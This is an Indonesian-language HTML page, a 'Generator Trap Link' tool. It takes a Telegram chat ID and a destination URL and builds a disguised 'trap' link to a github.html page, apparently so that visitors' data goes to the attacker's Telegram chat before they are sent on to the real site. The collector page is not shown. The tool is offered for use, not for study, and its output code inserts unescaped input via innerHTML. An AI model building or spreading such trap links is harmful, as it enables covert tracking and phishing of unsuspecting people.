<!DOCTYPE html>
<html>
<head>
    <title>Generator Trap Link</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0d1117;
            color: white;
            text-align: center;
            padding: 20px;
        }
        input {
            padding: 10px;
            margin: 8px;
            border: none;
            border-radius: 5px;
            width: 300px;
        }
        button {
            padding: 10px 20px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #2ea043;
        }
        .output {
            margin-top: 20px;
            background: #161b22;
            padding: 15px;
            border-radius: 5px;
            word-break: break-word;
        }
    </style>
</head>
<body>

    <h1>Generator Trap Link</h1>
    <p>Masukkan Chat ID Telegram dan Link Tujuan</p>

    <input type="text" id="chatId" placeholder="Masukkan Chat ID Telegram">
    <br>
    <input type="text" id="targetLink" placeholder="Masukkan Link Tujuan (contoh: https://tiktok.com/...)">
    <br>
    <button onclick="generateLink()">Buat Link Trap</button>

    <div class="output" id="output"></div>

    <script>
        function generateLink() {
            let chatId = document.getElementById("chatId").value.trim();
            let target = document.getElementById("targetLink").value.trim();

            if (!chatId || !target) {
                alert("Harap isi semua kolom!");
                return;
            }

            let encodedTarget = encodeURIComponent(target);
            let link = window.location.origin + "/Web/github.html?chatid=" + chatId + "&target=" + encodedTarget;

            document.getElementById("output").innerHTML = `
                <p>Link Trap:</p>
                <input type="text" value="${link}" readonly>
            `;
        }
    </script>

</body>
</html>
